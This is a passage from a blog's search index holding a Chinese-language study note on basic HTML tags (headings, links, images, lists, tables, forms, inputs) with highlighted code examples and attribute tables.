<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTML CSS 学习记录</title>
    <url>/2024/04/04/HTML%20CSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTML 是用来描述网页的一种语言。</p>
<p>HTML 指的是超文本标记语言 (Hyper Text Markup Language)</p>
<p>HTML 不是一种编程语言，而是一种标记语言 (Markup Language)</p>
<h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><h4 id="纯文本"><a href="#纯文本" class="headerlink" title="纯文本"></a>纯文本</h4><p>文字，放在 .txt 文件中</p>
<h4 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h4><p>图片、视频、样式，放在 .html .htm .doc .ppt 等文件中</p>
<h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><h3 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 静态网页 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- 定义文档类型为 HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- 指定页面语言，这里 en 表示文字的显示形式为英文，zh 为中文，也可以不写 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 页面头部部分的起始标签 --&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>  </span><br><span class="line">    	<span class="comment">&lt;!-- 字符集(编码格式)为 utf-8 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- utf-8 gbk gb2312 --&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">    	<span class="comment">&lt;!-- 定义页面的标题，将显示在浏览器的标题栏或选项卡上 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">	<span class="comment">&lt;!-- 页面头部部分的结束标签 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">	<span class="comment">&lt;!-- 页面主体部分的起始标签 --&gt;</span></span><br><span class="line">        </span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line">	<span class="comment">&lt;!-- 页面主体部分的结束标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- 用于结束 HTML 标签，表示 HTML 文档的结束 --&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;head&gt; &lt;/head&gt;</code> 及里面的内容为页面头部</p>
<p><code>&lt;body&gt; &lt;/body&gt;</code> 及里面的内容为页面主体</p>
<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>HTML 元素指的是从开始标签（start tag）到结束标签（end tag）的所有代码。 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com.cn&quot;</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">开始标签</th>
<th align="center">元素</th>
<th align="center">结束标签</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&lt;a href=&quot;http://www.baidu.com.cn&quot;&gt;</code></td>
<td align="center">百度一下，你就知道</td>
<td align="center"><code>&lt;/a&gt;</code></td>
</tr>
</tbody></table>
<p>注：开始标签常被称为开放标签（opening tag），结束标签常称为闭合标签（closing tag）。</p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>HTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。</p>
<p>属性总是以名称&#x2F;值对的形式出现，比如：<code>name=&quot;value&quot;</code>。</p>
<p>属性总是在 HTML 元素的开始标签中规定。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>

<p>快捷键：Ctrl + shift + &#x2F;</p>
<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span> 内容 <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>HTML 元素由开始标签和结束标签组成。</p>
<p>位于开始标签和结束标签中间的文本是元素的内容。</p>
<p>HTML 标签有开始必须有结束。如果是没有内容的标签（空标签），用 <code>/&gt;</code> 来结束。</p>
<p>标签具有属性，属性用来表示标签的性质和特征。属性要在开始标签中指定。</p>
<h5 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h5><p>单标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/&gt;</span></span><br></pre></td></tr></table></figure>

<p>双标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span> <span class="tag">&lt;/&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h5><h6 id="标题标签"><a href="#标题标签" class="headerlink" title="&lt;h1&gt; - &lt;h6&gt; 标题标签"></a><code>&lt;h1&gt;</code> - <code>&lt;h6&gt;</code> 标题标签</h6><p><code>&lt;h1&gt;</code> - <code>&lt;h6&gt;</code> 标签被用来定义 HTML 标题。</p>
<p><code>&lt;h1&gt;</code> 定义重要等级最高的标题。<code>&lt;h6&gt;</code> 定义重要等级最低的标题。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 双标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> h1 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span> h6 <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从 h1 到 h6 一共分为7个标签，可以起到加大、加粗、描黑文字的作用。</p>
<p>注：此标签大小写不敏感，可以将 h 换为 H 。</p>
<h6 id="段落标签"><a href="#段落标签" class="headerlink" title="&lt;p&gt; 段落标签"></a><code>&lt;p&gt;</code> 段落标签</h6><p><code>&lt;p&gt;</code> 标签定义段落。</p>
<p><code>&lt;p&gt;</code>元素会自动在其前后创建一些空白。浏览器会自动添加这些空间，也可以在样式表中规定。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 双标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> 这是一个段落 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span> 段落水平居中 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">align</td>
<td align="center">left、center、right</td>
<td align="center">设定水平对齐方式</td>
</tr>
</tbody></table>
<p>注：被废弃了但是还能用</p>
<h6 id="换行标签"><a href="#换行标签" class="headerlink" title="&lt;br&gt; 换行标签"></a><code>&lt;br&gt;</code> 换行标签</h6><p><code>&lt;br&gt;</code> 标签插入一个简单的换行符。</p>
<p><code>&lt;br&gt;</code> 标签是一个空标签，意味着它没有结束标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 单标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：请使用 <code>&lt;br&gt;</code> 标签来输入空行，而不是分割段落。</p>
<h6 id="图片标签"><a href="#图片标签" class="headerlink" title="&lt;img&gt; 图片标签"></a><code>&lt;img&gt;</code> 图片标签</h6><p><code>&lt;img&gt;</code> 标签定义 HTML 页面中的图像。</p>
<p><code>&lt;img&gt;</code> 标签有两个必需的属性：<code>src</code> 和 <code>alt</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 单标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;加载失败&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 相对路径 --&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">src</td>
<td align="center">url</td>
<td align="center">设定图片地址</td>
</tr>
<tr>
<td align="center">alt</td>
<td align="center">text</td>
<td align="center">当图片无法显示时，显示此提示信息</td>
</tr>
<tr>
<td align="center">width</td>
<td align="center">px、%</td>
<td align="center">设定图片宽度</td>
</tr>
<tr>
<td align="center">height</td>
<td align="center">px、%</td>
<td align="center">设定图片高度</td>
</tr>
</tbody></table>
<p>如何指定图片地址？</p>
<table>
<thead>
<tr>
<th align="center">情形</th>
<th align="center">写法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">图片在同一级目录</td>
<td align="center"><code>&lt;img src=&quot;img/1.jpg&quot; alt=&quot;&quot; /&gt;</code>  <code>&lt;img src=&quot;./img/1.jpg&quot; alt=&quot;&quot; /&gt;</code></td>
</tr>
<tr>
<td align="center">图片在上一级目录</td>
<td align="center"><code>&lt;img src=&quot;../img/1.jpg&quot; alt=&quot;&quot; /&gt;</code></td>
</tr>
</tbody></table>
<p>注：通过在 <code>&lt;a&gt;</code> 标签中嵌套 <code>&lt;img&gt;</code> 标签，给图像添加到另一个文档的链接。</p>
<h6 id="超链接标签"><a href="#超链接标签" class="headerlink" title="&lt;a&gt; 超链接标签"></a><code>&lt;a&gt;</code> 超链接标签</h6><p><code>&lt;a&gt;</code> 标签定义超链接，用于从一个页面链接到另一个页面。</p>
<p><code>&lt;a&gt;</code> 元素最重要的属性是 <code>href</code> 属性，它指定链接的目标。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 双标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> &gt;</span> 百度 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 套娃(?) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> &gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1920&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1080&quot;</span> /&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- 点击图片进行跳转 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">href</td>
<td align="center">url</td>
<td align="center">设定链接地址</td>
</tr>
<tr>
<td align="center">target</td>
<td align="center">_blank</td>
<td align="center">设定在何处打开链接。”_blank” 为在新标签页打开网站</td>
</tr>
<tr>
<td align="center">title</td>
<td align="center">text</td>
<td align="center">设定链接提示信息</td>
</tr>
</tbody></table>
<p><strong>锚点</strong>：<code>href</code> 的特性</p>
<p>可以达到快速跳转的目的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#bt1&quot;</span> &gt;</span> 标题1 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#bt2&quot;</span> &gt;</span> 标题2 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#bt3&quot;</span> &gt;</span> 标题3 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;bt1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">		1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;bt2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">		2</span><br><span class="line">	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;bt2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">		3</span><br><span class="line">	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h6><p><strong>无序号列表：</strong></p>
<p><code>&lt;ul&gt;</code> 标签定义无序列表。</p>
<p>将 <code>&lt;ul&gt;</code> 标签与 <code>&lt;li&gt;</code> 标签一起使用，创建无序列表。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;ul&gt; &lt;/ul&gt;</code> 里的 <code>&lt;li&gt; &lt;/li&gt;</code> 可以嵌套 <code>&lt;ul&gt; &lt;/ul&gt;</code>，已达分层的目的</p>
<p><strong>有序号列表：</strong></p>
<p><code>&lt;ol&gt;</code> 标签定义了一个有序列表， 列表排序以数字来显示。</p>
<p>使用 <code>&lt;li&gt;</code> 标签来定义列表选项。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：两者可以相互嵌套</p>
<p><strong>自定义列表：</strong></p>
<p><code>&lt;dl&gt;</code> 标签定义一个描述列表。</p>
<p><code>&lt;dl&gt;</code> 标签与 <code>dt</code> 和 <code>dd</code> （描述每一个项目&#x2F;名字）一起使用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span><span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 总的大类 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 大类各种小类 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="表格标签"><a href="#表格标签" class="headerlink" title="&lt;table&gt; 表格标签"></a><code>&lt;table&gt;</code> 表格标签</h6><p><code>&lt;table&gt;</code> 标签定义 HTML 表格</p>
<p>一个 HTML 表格包括 <code>&lt;table&gt;</code> 元素，一个或多个 <code>&lt;tr&gt;</code>、<code>&lt;th&gt;</code> 以及 <code>&lt;td&gt;</code> 元素。</p>
<p><code>&lt;tr&gt;</code> 元素定义表格行，<code>&lt;th&gt;</code> 元素定义表头，<code>&lt;td&gt;</code> 元素定义表格单元。</p>
<p>更复杂的 HTML 表格也可能包括 <code>&lt;caption&gt;</code>、<code>&lt;col&gt;</code>、<code>&lt;colgroup&gt;</code>、<code>&lt;thead&gt;</code>、<code>&lt;tfoot&gt;</code> 以及 <code>&lt;tbody&gt;</code> 元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表格 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 表格标题 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 行 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 表头 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span> 第一行第一列 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 列及内容 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span> 第一行第二列 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span> 第二行第一列 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span> 第二行第二列 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">	... </span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">border</td>
<td align="center">1</td>
<td align="center">设定边框</td>
</tr>
<tr>
<td align="center">style</td>
<td align="center">text-align: left、center、right;</td>
<td align="center">设定水平对齐方式</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">colspan</td>
<td align="center">自定的正整数 n</td>
<td align="center">横跨 n 列并合并</td>
</tr>
<tr>
<td align="center">rowspan</td>
<td align="center">自定的正整数 n</td>
<td align="center">竖跨 n 行并合并</td>
</tr>
</tbody></table>
<p> 注：colspan、rowspan 后多余的列、行会被挤出形成新的列，此时需要注释掉多余的列</p>
<h6 id="表单标签"><a href="#表单标签" class="headerlink" title="&lt;form&gt; 表单标签"></a><code>&lt;form&gt;</code> 表单标签</h6><p><code>&lt;form&gt;</code> 标签用于创建供用户输入的 HTML 表单。</p>
<p><code>&lt;form&gt;</code> 元素包含一个或多个如下的表单元素：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optgroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">	账号：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	密码：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    性别：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span>/&gt;</span>男</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span>/&gt;</span>女</span><br><span class="line">    <span class="comment">&lt;!-- 将name的值设置为同一个可以互斥，防止同时选的情况产生 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">action</td>
<td align="center">url</td>
<td align="center">设定表单提交地址</td>
</tr>
<tr>
<td align="center">method</td>
<td align="center">get、post</td>
<td align="center">设定表单数据提交方式</td>
</tr>
<tr>
<td align="center">enctype</td>
<td align="center">multipart&#x2F;form-data</td>
<td align="center">表单包含文件上传控件时，必须使用该值</td>
</tr>
</tbody></table>
<h6 id="输入标签"><a href="#输入标签" class="headerlink" title="&lt;input&gt; 输入标签"></a><code>&lt;input&gt;</code> 输入标签</h6><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。</p>
<p><code>&lt;input&gt;</code> 元素在 <code>&lt;form&gt;</code> 元素中使用，用来声明允许用户输入数据的 input 控件。</p>
<p>输入字段可通过多种方式改变，取决于 type 属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">type</td>
<td align="center">text、password、radio、checkbox、 submit、button、reset、image 、file、hidden</td>
<td align="center">设定元素类型</td>
</tr>
<tr>
<td align="center">name</td>
<td align="center">name</td>
<td align="center">设定元素名称</td>
</tr>
<tr>
<td align="center">value</td>
<td align="center">value</td>
<td align="center">设定元素的值</td>
</tr>
<tr>
<td align="center">maxlength</td>
<td align="center">number</td>
<td align="center">设定字符最大长度</td>
</tr>
<tr>
<td align="center">placeholder</td>
<td align="center">自定</td>
<td align="center">灰色文字提示</td>
</tr>
<tr>
<td align="center">checked</td>
<td align="center">无、checked</td>
<td align="center">为单选框、复选框设定默认选中项</td>
</tr>
</tbody></table>
<p>以下是 type 属性及其对应的作用的描述：</p>
<table>
<thead>
<tr>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">text</td>
<td align="center">文本框</td>
</tr>
<tr>
<td align="center">password</td>
<td align="center">密码框</td>
</tr>
<tr>
<td align="center">radio</td>
<td align="center">单选框</td>
</tr>
<tr>
<td align="center">checkbox</td>
<td align="center">复选框</td>
</tr>
<tr>
<td align="center">submit</td>
<td align="center">提交按钮</td>
</tr>
<tr>
<td align="center">button</td>
<td align="center">普通按钮</td>
</tr>
<tr>
<td align="center">reset</td>
<td align="center">重置按钮，初始化当前页面</td>
</tr>
<tr>
<td align="center">image</td>
<td align="center">图片按钮</td>
</tr>
<tr>
<td align="center">file</td>
<td align="center">文件域</td>
</tr>
<tr>
<td align="center">hidden</td>
<td align="center">隐藏域</td>
</tr>
</tbody></table>
<h6 id="文本域标签"><a href="#文本域标签" class="headerlink" title="&lt;textarea&gt; 文本域标签"></a><code>&lt;textarea&gt;</code> 文本域标签</h6><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p>
<p>文本区域中可容纳无限数量的文本，其中的文本的默认字体是等宽字体（通常是 Courier）。</p>
<p>可以通过 cols 和 rows 属性来规定 textarea 的尺寸大小，不过更好的办法是使用 CSS 的 height 和 width 属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
